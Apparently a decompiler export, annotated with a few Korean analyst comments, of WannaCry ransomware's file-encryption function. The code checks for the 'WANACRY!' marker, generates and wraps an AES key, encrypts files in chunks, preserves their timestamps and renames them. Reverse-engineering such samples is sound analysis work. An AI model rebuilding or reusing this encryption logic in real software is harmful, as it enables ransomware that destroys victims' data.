// --- Metadata ---
// Function Name: EncryptFile_10001960
// Address: 0x10001960
// Exported At: 20250522_122123
// Signature: unknown_signature
// ---------------
BOOL __thiscall EncryptFile_10001960(int this, int a2, wchar_t *Format, int a4)
{
  DWORD v5; // edi AES 암호화 WANACRY! 헤더 
  HANDLE v6; // esi
  HANDLE v8; // esi
  HANDLE v9; // edi
  unsigned int v10; // eax
  _DWORD *v11; // eax
  unsigned int v12; // esi
  BOOL v13; // esi
  void (__stdcall *v14)(int, wchar_t *, LONG, DWORD, int, int); // ebx
  unsigned int v15; // [esp+1Ch] [ebp-754h] BYREF
  char v16[512]; // [esp+20h] [ebp-750h] BYREF
  _DWORD v17[128]; // [esp+220h] [ebp-550h] BYREF
  HANDLE hFile; // [esp+420h] [ebp-350h]
  int v19; // [esp+424h] [ebp-34Ch]
  DWORD v20; // [esp+428h] [ebp-348h] BYREF
  unsigned int v21; // [esp+42Ch] [ebp-344h] BYREF
  int v22; // [esp+430h] [ebp-340h]
  struct _FILETIME CreationTime; // [esp+434h] [ebp-33Ch] BYREF
  struct _FILETIME LastAccessTime; // [esp+43Ch] [ebp-334h] BYREF
  struct _FILETIME LastWriteTime; // [esp+444h] [ebp-32Ch] BYREF
  char v26[5]; // [esp+44Ch] [ebp-324h] BYREF
  __int16 v27; // [esp+451h] [ebp-31Fh]
  char v28; // [esp+453h] [ebp-31Dh]
  LARGE_INTEGER FileSize; // [esp+454h] [ebp-31Ch] BYREF
  int v30; // [esp+45Ch] [ebp-314h]
  BYTE pbBuffer[16]; // [esp+460h] [ebp-310h] BYREF
  int v32; // [esp+470h] [ebp-300h]
  LARGE_INTEGER v33; // [esp+474h] [ebp-2FCh]
  unsigned int v34; // [esp+47Ch] [ebp-2F4h] BYREF
  int v35; // [esp+480h] [ebp-2F0h] BYREF
  wchar_t Buffer; // [esp+484h] [ebp-2ECh] BYREF
  char v37[716]; // [esp+486h] [ebp-2EAh] BYREF
  __int16 v38; // [esp+752h] [ebp-1Eh]
  BOOL v39; // [esp+754h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+758h] [ebp-18h] BYREF

  Buffer = word_1000D918;
  memset(v37, 0, sizeof(v37));
  v38 = 0;
  hFile = (HANDLE)-1;
  v22 = -1;
  v5 = 0x80000000;
  v32 = this + 4;
  v20 = 0;
  v26[0] = 0;
  *(_DWORD *)&v26[1] = 0;
  v27 = 0;
  v28 = 0;
  v21 = 0;
  v30 = 0;
  v34 = 0;
  v35 = 0;
  ms_exc.registration.TryLevel = 0;
  if ( a4 == 3 )
  {
    v5 = -1073741824;
    v19 = -1073741824;
  }
  v6 = CreateFileW_0((LPCWSTR)a2, v5, 3u, 0, 3u, 0, 0);
  hFile = v6;
  if ( v6 == (HANDLE)-1 )
  {
    if ( !return0_10003000() )
    {
LABEL_61:
      local_unwind2(&ms_exc.registration, -1);
      return 0;
    }
    v6 = CreateFileW_0((LPCWSTR)a2, v5, 3u, 0, 3u, 0, 0);
    hFile = v6;
    if ( v6 == (HANDLE)-1 )
    {
      local_unwind2(&ms_exc.registration, -1);
      return 0;
    }
  }
  if ( !GetFileSizeEx(v6, &FileSize) )
  {
    local_unwind2(&ms_exc.registration, -1);
    return 0;
  }
  GetFileTime(v6, &CreationTime, &LastAccessTime, &LastWriteTime);// 헤더 확인 
  if ( ReadFile_0(v6, v26, 8u, &v34, 0)
    && !memcmp(v26, "WANACRY!", 8u)
    && ReadFile_0(hFile, &v15, 4u, &v34, 0)
    && v15 <= 0x200
    && v15 == 256
    && ReadFile_0(hFile, v16, 0x100u, &v34, 0)
    && ReadFile_0(hFile, &v21, 4u, &v34, 0)
    && v21 >= a4 )
  {
    local_unwind2(&ms_exc.registration, -1);
    return 1;
  }
  v8 = hFile;
  SetFilePointer(hFile, 0, 0, 0);
  if ( a4 == 4 )
  {
    swprintf(&Buffer, (const size_t)L"%s%s", Format, L"T");
    v9 = CreateFileW_0(&Buffer, 0x40000000u, 0, 0, 2u, 0x80u, 0);
    v22 = (int)v9;
    if ( v9 == (HANDLE)-1 )
    {
      v9 = CreateFileW_0(&Buffer, 0x40000000u, 3u, 0, 2u, 0x80u, 0);
      v22 = (int)v9;
      if ( v9 == (HANDLE)-1 )
        goto LABEL_61;
    }
    if ( v21 == 3 )
      FileSize.QuadPart -= 0x10000i64;
  }
  else
  {
    if ( !ReadFile_0(v8, *(LPVOID *)(this + 1224), 0x10000u, &v34, 0) )
      goto LABEL_61;
    if ( v34 != 0x10000 )
      goto LABEL_61;
    SetFilePointer(v8, 0, 0, 2u);
    if ( !WriteFile_0(v8, *(LPCVOID *)(this + 1224), 0x10000u, (LPDWORD)&v35, 0) )
      goto LABEL_61;
    if ( v35 != 0x10000 )
      goto LABEL_61;
    memset(*(void **)(this + 1224), 0, 0x10000u);
    SetFilePointer(v8, 0, 0, 0);
    if ( !WriteFile_0(v8, *(LPCVOID *)(this + 1224), 0x10000u, (LPDWORD)&v35, 0) || v35 != 0x10000 )
      goto LABEL_61;
    SetFilePointer(v8, 0, 0, 0);
    v9 = v8;
    v22 = (int)v8;
  }
  if ( a4 == 4 && FileSize.HighPart <= 0 && FileSize.LowPart < 0xC800000 )
  {
    if ( *(_DWORD *)(this + 2328) )
    {
      if ( !((unsigned int)rand() % *(_DWORD *)(this + 2328)) )
      {
        v10 = *(_DWORD *)(this + 2336);
        if ( v10 < *(_DWORD *)(this + 2332) )
        {
          v30 = 1;
          v32 = this + 44;
          *(_DWORD *)(this + 2336) = v10 + 1;
        }
      }
    }
  }
  v20 = 512;
  if ( !GenerateAndEncryptRandomData_10004370(v32, pbBuffer, 0x10u, (int)v17, (int)&v20) )
    goto LABEL_61;
  InitializeAESContext_10005DC0(this + 84, (int)pbBuffer, (int)off_1000D8D4, 16, 16);
  memset(pbBuffer, 0, sizeof(pbBuffer));
  if ( !WriteFile_0(v9, "WANACRY!", 8u, (LPDWORD)&v35, 0)
    || !WriteFile_0(v9, &v20, 4u, (LPDWORD)&v35, 0)
    || !WriteFile_0(v9, v17, v20, (LPDWORD)&v35, 0)
    || !WriteFile_0(v9, &a4, 4u, (LPDWORD)&v35, 0)
    || !WriteFile_0(v9, &FileSize, 8u, (LPDWORD)&v35, 0) )
  {
    goto LABEL_61;
  }
  if ( a4 == 4 )
  {
    v33 = FileSize;
    if ( v21 != 3 )
      goto LABEL_52;
    SetFilePointer(v8, -65536, 0, 2u);
    if ( !ReadFile_0(v8, *(LPVOID *)(this + 1224), 0x10000u, &v34, 0) )
      goto LABEL_61;
    if ( v34 != 0x10000 )
      goto LABEL_61;
    AESEncryptWithMode_10006940(this + 84, *(_DWORD *)(this + 1224), *(char **)(this + 1228), 0x10000u, 1);
    if ( !WriteFile_0(v9, *(LPCVOID *)(this + 1228), 0x10000u, (LPDWORD)&v35, 0) || v35 != 0x10000 )
      goto LABEL_61;
    SetFilePointer(v8, 0x10000, 0, 0);
    v33.QuadPart -= 0x10000i64;
LABEL_52:
    while ( v33.QuadPart > 0 )
    {
      v11 = *(_DWORD **)(this + 1232);
      if ( (!v11 || !*v11) && ReadFile_0(hFile, *(LPVOID *)(this + 1224), 0x100000u, &v34, 0) && v34 )
      {
        v33.QuadPart -= v34;
        v12 = 16 * (((v34 - 1) >> 4) + 1);
        if ( v12 > v34 )
          memset((void *)(v34 + *(_DWORD *)(this + 1224)), 0, v12 - v34);
        AESEncryptWithMode_10006940(this + 84, *(_DWORD *)(this + 1224), *(char **)(this + 1228), v12, 1);
        if ( WriteFile_0((HANDLE)v22, *(LPCVOID *)(this + 1228), v12, (LPDWORD)&v35, 0) )
        {
          if ( v35 == v12 )
            continue;
        }
      }
      goto LABEL_61;
    }
    v8 = hFile;
    v9 = (HANDLE)v22;
  }
  SetFileTime(v9, &CreationTime, &LastAccessTime, &LastWriteTime);
  if ( a4 == 4 )
  {
    dword_1000D934(v8);
    dword_1000D934(v9);
    v22 = -1;
    hFile = (HANDLE)-1;
    v13 = MoveFileW(&Buffer, Format);
    v39 = v13;
    if ( v13 )
      SetFileAttributesW(Format, 0x80u);
    else
      DeleteFileW_0(&Buffer);
  }
  else
  {
    dword_1000D934(v8);
    v22 = -1;
    hFile = (HANDLE)-1;
    v13 = MoveFileW((LPCWSTR)a2, Format);
    v39 = v13;
  }
  if ( v13 )
  {
    v14 = *(void (__stdcall **)(int, wchar_t *, LONG, DWORD, int, int))(this + 1236);
    if ( v14 )
      v14(a2, Format, FileSize.HighPart, FileSize.LowPart, a4, v30);
  }
  local_unwind2(&ms_exc.registration, -1);
  return v13;
}
